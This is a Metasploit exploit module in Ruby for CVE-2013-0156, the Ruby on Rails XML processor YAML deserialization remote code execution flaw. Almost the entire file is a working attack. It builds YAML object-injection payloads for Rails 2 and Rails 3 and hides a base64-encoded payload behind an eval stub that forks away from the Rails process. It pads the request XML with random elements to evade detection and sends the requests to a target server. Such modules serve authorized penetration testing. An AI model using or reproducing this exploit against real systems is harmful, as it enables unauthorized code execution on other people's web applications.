##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking

include Msf::Exploit::CmdStagerTFTP
include Msf::Exploit::Remote::HttpClient

def initialize(info = {})
super(update_info(info,
'Name' => 'Ruby on Rails XML Processor YAML Deserialization Code Execution',
'Description' => %q{
This module exploits a remote code execution vulnerability in the XML request
processor of the Ruby on Rails application framework. This vulnerability allows
an attacker to instantiate a remote object, which in turn can be used to execute
any ruby code remotely in the context of the application.

This module has been tested across multiple versions of RoR 3.x and RoR 2.x

The technique used by this module requires the target to be running a fairly version
of Ruby 1.9 (since 2011 or so). Applications using Ruby 1.8 may still be
exploitable using the init_with() method, but this has not been demonstrated.

},
'Author' =>
[
'charliesome', # PoC
'espes', # PoC and Metasploit module
'lian', # Identified the RouteSet::NamedRouteCollection vector
'hdm' # Module merge/conversion/payload work
],
'License' => MSF_LICENSE,
'References' =>
[
['CVE', '2013-0156'],
['URL', 'https://community.rapid7.com/community/metasploit/blog/2013/01/09/serialization-mischief-in-ruby-land-cve-2013-0156']
],
'Platform' => 'ruby',
'Arch' => ARCH_RUBY,
'Privileged' => false,
'Targets' => [ ['Automatic', {} ] ],
'DisclosureDate' => 'Jan 7 2013',
'DefaultTarget' => 0))

register_options(
[
Opt::RPORT(80),
OptString.new('URIPATH', [ true, 'The path to a vulnerable Ruby on Rails application', "/"]),
OptString.new('HTTP_METHOD', [ true, 'The HTTP request method (GET, POST, PUT typically work)', "POST"])

], self.class)

register_evasion_options(
[
OptBool.new('XML::PadElement', [ true, 'Pad the exploit request with randomly generated XML elements', true])
], self.class)
end


#
# This stub ensures that the payload runs outside of the Rails process
# Otherwise, the session can be killed on timeout
#
def detached_payload_stub(code)
%Q^
code = '#{ Rex::Text.encode_base64(code) }'.unpack("m0").first
if RUBY_PLATFORM =~ /mswin|mingw|win32/
inp = IO.popen("ruby", "wb") rescue nil
if inp
inp.write(code)
inp.close
end
else
if ! Process.fork()
eval(code) rescue nil
end
end
^.strip.split(/\n/).map{|line| line.strip}.join("\n")
end

#
# Create the YAML document that will be embedded into the XML
#
def build_yaml_rails2

# Embed the payload with the detached stub
code = Rex::Text.encode_base64( detached_payload_stub(payload.encoded) )
yaml =
"--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection\n" +
"'#{Rex::Text.rand_text_alpha(rand(8)+1)}; " +
"eval(%[#{code}].unpack(%[m0])[0]);' " +
": !ruby/object:ActionController::Routing::Route\n segments: []\n requirements:\n " +
":#{Rex::Text.rand_text_alpha(rand(8)+1)}:\n :#{Rex::Text.rand_text_alpha(rand(8)+1)}: " +
":#{Rex::Text.rand_text_alpha(rand(8)+1)}\n"
yaml
end


#
# Create the YAML document that will be embedded into the XML
#
def build_yaml_rails3

# Embed the payload with the detached stub
code = Rex::Text.encode_base64( detached_payload_stub(payload.encoded) )
yaml =
"--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\n" +
"'#{Rex::Text.rand_text_alpha(rand(8)+1)}; " +
"eval(%[#{code}].unpack(%[m0])[0]);' " +
": !ruby/object:OpenStruct\n table:\n :defaults: {}\n"
yaml
end


#
# Create the XML wrapper with any desired evasion
#
def build_request(v)
xml = ''

elo = Rex::Text.rand_text_alpha(rand(12)+4)

if datastore['XML::PadElement']
xml << "<#{elo}>"

1.upto(rand(1000)+50) do
el = Rex::Text.rand_text_alpha(rand(12)+4)
tp = ['string', 'integer'][ rand(2) ]
xml << "<#{el} type='#{tp}'>"
xml << ( tp == "integer" ? Rex::Text.rand_text_numeric(rand(8)+1) : Rex::Text.rand_text_alphanumeric(rand(8)+1) )
xml << "</#{el}>"
end
end

el = Rex::Text.rand_text_alpha(rand(12)+4)
xml << "<#{el} type='yaml'>"
xml << (v == 2 ? build_yaml_rails2 : build_yaml_rails3)
xml << "</#{el}>"

if datastore['XML::PadElement']
1.upto(rand(1000)+50) do
el = Rex::Text.rand_text_alpha(rand(12)+4)
tp = ['string', 'integer'][ rand(2) ]
xml << "<#{el} type='#{tp}'>"
xml << ( tp == "integer" ? Rex::Text.rand_text_numeric(rand(8)+1) : Rex::Text.rand_text_alphanumeric(rand(8)+1) )
xml << "</#{el}>"
end

xml << "</#{elo}>"
end

xml
end

#
# Send the actual request
#
def exploit

print_status("Sending Railsv3 request to #{rhost}:#{rport}...")
res = send_request_cgi({
'uri' => datastore['URIPATH'] || "/",
'method' => datastore['HTTP_METHOD'],
'ctype' => 'application/xml',
'headers' => { 'X-HTTP-Method-Override' => 'get' },
'data' => build_request(3)
}, 25)
handler

print_status("Sending Railsv2 request to #{rhost}:#{rport}...")
res = send_request_cgi({
'uri' => datastore['URIPATH'] || "/",
'method' => datastore['HTTP_METHOD'],
'ctype' => 'application/xml',
'headers' => { 'X-HTTP-Method-Override' => 'get' },
'data' => build_request(2)
}, 25)
handler
end
end
